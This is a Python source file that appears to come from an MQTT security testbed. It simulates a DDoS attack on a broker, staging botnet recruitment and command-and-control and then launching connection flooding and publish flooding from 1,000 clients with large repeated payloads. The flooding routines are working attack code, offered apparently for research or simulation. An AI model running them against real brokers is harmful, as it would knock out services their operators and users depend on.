from utils.storyboard import StateMachineConfig as S
from utils.storyboard import MqttConfig, LogConfig
from mqtt_communication_module.Scenario_msg_handler.DDos.botnet import BotnetClient
import time
import threading
import paho.mqtt.client as mqtt
from utils.msglog import log_att_process, msg_log
import json


# target->Connection Flooding / Publish Flooding
class DDOSAttackScenario:
    def __init__(self, target, protocol, use_encryption=None, enable_allowlist=False, time=None):
        self.target_protocol = protocol  # Attack target protocol
        self.target = target
        self.time = time
        self.use_encryption = use_encryption
        self.enable_allowlist = enable_allowlist
        self.current_state = None
        self.attack_type = None
        self.success = False
        self.broker = MqttConfig.MQTT_BROKER
        self.port = MqttConfig.MQTT_PORT
        self.file_path = LogConfig.RUNTIME_REPORT
        self.msg_file = LogConfig.FILE_BUILDING_LOG  # broker

        self.allowlist = MqttConfig.ALLOWLIST

        self.num_clients = 1000 # Number of simulated attack clients
        #self.frequency = 1000
        self.send_topic = [MqttConfig.ATT_TOPIC]
        self.recv_topic = []
        self.msg = {'command': 'attack' }
        self.max_concurrent = 500  # 50，100,500 The number of connections initiated simultaneously in each batch
        self.clients = []  # Store botnet clients

        if self.target == "C":
            self.attack_type = 'Connection'
        elif self.target == "P":
            self.attack_type = 'Publish'

        # DDOS task
        self.states = {
            S.A0: self.reconnaissance,
            S.A1: self.botnet_recruitment,
            S.A2: self.c_c,  # Command and Control Setup
            S.A3: self.attack_launch  # The main stages of launching an attack
        }

    def start_attack(self):
        self.attack_in_progress = True
        self.current_state = S.A0
        print(f"Starting DDOS attack with {self.target}--------------")
        msg = f"->Starting DDOS attack with {self.target}--------------"
        log_att_process(self.file_path, msg)
        while self.current_state in self.states:
            self.states[self.current_state]()

    def reconnaissance(self):
        print("->Reconnaissance target............")
        msg = f"->Reconnaissance target phase..."
        log_att_process(self.file_path, msg)
        self.current_state = S.A1

    def botnet_recruitment(self):
        # print("Recruiting botnet clients...")
        log_att_process(self.file_path, "->Starting botnet recruitment...")
        self.clients = [BotnetClient(self.send_topic, self.recv_topic, self.broker, self.port, self.time, self.enable_allowlist)
                       for _ in range(self.num_clients)]

        for _ in range(self.num_clients):
            client = BotnetClient(self.send_topic, self.recv_topic, self.broker, self.port, self.time, self.enable_allowlist)
            if not client.is_connected:
                log_att_process(self.file_path, f"->Failed to connect Botclient with IP {client.client_ip}. Skipping.")
                return

            self.clients.append(client)

        if not self.clients:
            log_att_process(self.file_path, "->Failed to recruit any Botnet clients.")
            self.current_state = None
            return

        log_att_process(self.file_path, "->Botnet recruitment completed------")
        self.current_state = S.A2


    # Command and Control Setup
    def c_c(self):
        if self.current_state == S.A2:
            if self.attack_type == 'Connection':
                print("Setting up Command and Control for Connection Flooding---")
                log_att_process(self.file_path, "C&C setup for Connection Flooding---")
            elif self.attack_type == 'Publish':
                print("Setting up Command and Control for Publish Flooding++++++")
                log_att_process(self.file_path, "C&C setup for Publish Flooding++++")
            self.current_state = S.A3
        return

    def attack_launch(self):
        if self.attack_type == 'Connection':
            self.launch_attack_C()  # Connection Flooding
        elif self.attack_type == 'Publish':
            self.launch_attack_P(rate=1000, duration=180)

    # Connection Flooding 攻击
    def launch_attack_C(self):
        """Connection Flooding attack with improved impact on broker."""
        time.sleep(5)
        print("Starting Connection Flooding+++++")
        log_att_process(self.file_path, "Starting Connection Flooding++++")

        threads = []
        for i in range(0, self.num_clients, self.max_concurrent):
            batch = self.clients[i:i + self.max_concurrent]
            for client in batch:
                thread = threading.Thread(target=client.connect)  # Directly call the connect method of BotnetClient
                threads.append(thread)
                log_att_process(self.file_path, f"Botnet connect from {client.client_ip}")
                thread.start()

            # Wait for the current batch of connections to complete
            for thread in threads:
                thread.join()

            # Limit the frequency of attacks to avoid consuming resources too quickly
            # time.sleep(self.frequency)

            print("Connection Flooding finished------------")
            # log_att_process(self.file_path, "Connection Flooding finished------------")


    # Publish Flooding ATT
    def launch_attack_P(self, rate=None, duration=None):
        print("Starting Publish Flooding+++++")
        log_att_process(self.file_path, "Starting Publish Flooding++++")
        clients = [mqtt.Client() for _ in range(self.num_clients)]
        for client in clients:
            try:
                client.connect(self.broker, self.port, keepalive=120)
                client.loop_start()
            except Exception as e:
                log_att_process(self.file_path, f"Error during connection: {e}")
                return

        start_time = time.time()
        payload = json.dumps(self.msg) * 2000 # 1000/2000

        while time.time() - start_time < duration:
            for client in clients:
                try:
                    # client.publish(topic=self.topic, payload=payload)
                    client.publish(topic=self.send_topic[0], payload=payload)
                    # client.publish(topic=MqttConfig.TOPIC_B2R, payload=payload)
                    client.publish(topic=MqttConfig.TOPIC_B2D, payload=payload)
                    print(f"Sent message: '{payload}' to topic: {self.send_topic[0]}")
                    log_att_process(self.file_path, "Attacker Sent message")
                except Exception as e:
                    log_att_process(self.file_path, f"Error during publishing: {e}")
            # time.sleep(1 / rate)

        for client in clients:
            client.loop_stop()
            client.disconnect()

        log_att_process(self.file_path, "Publish Flooding finished+++++++++++")
